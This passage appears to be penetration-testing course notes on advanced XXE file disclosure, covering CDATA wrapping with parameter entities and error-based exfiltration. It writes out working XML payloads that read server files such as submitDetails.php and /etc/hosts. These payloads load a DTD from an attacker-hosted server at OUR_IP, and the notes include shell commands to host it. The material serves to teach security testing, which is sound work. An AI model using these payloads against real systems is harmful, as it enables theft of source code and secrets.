# Advanced File Disclosure

Not all XXE vulnerabilities are straightforward to exploit. Some file formats may not be readable through basic XXE, and web applications may not output input values in certain instances. We can attempt to force output through errors.

## Advanced Exfiltration with CDATA

Basic XXE methods (like PHP filters) prevent reading certain files because special characters break XML format. We can wrap external file content with CDATA tags to treat data as raw content:

```xml
<!ENTITY begin "<![CDATA[">
<!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
<!ENTITY end "]]>">
<!ENTITY joined "&begin;&file;&end;">
```

However, XML prevents joining internal and external entities. Instead, use **XML Parameter Entities** (prefixed with `%`) that can be referenced from external sources and joined together:

```xml
<!ENTITY joined "%begin;%file;%end;">
```

### Implementation

1. Create and host a DTD file:
```bash
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000
```

2. Send this payload to the vulnerable application:
```xml
<!DOCTYPE email [
    <!ENTITY % begin "<![CDATA[">
    <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
    <!ENTITY % end "]]>">
    <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd">
    %xxe;
]>
<email>&joined;</email>
```

This retrieves file content without base64 encoding, making it faster for reading secrets and passwords.

**Note:** Modern servers may block self-referencing entities to prevent DOS attacks.

## Error-Based XXE

When the application doesn't output XML data, we can exploit error messages to exfiltrate content.

### Testing for Errors

Send malformed XML to trigger error messages:
```xml
<!-- Delete closing tags or reference non-existing entities -->
<root>&nonExistingEntity;</root>
```

### Exploitation

Host a DTD file containing:
```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

Send this payload:
```xml
<!DOCTYPE email [
    <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
    %remote;
    %error;
]>
```

The error message will include the file content. This method works for source code but has length limitations and may fail with special characters.
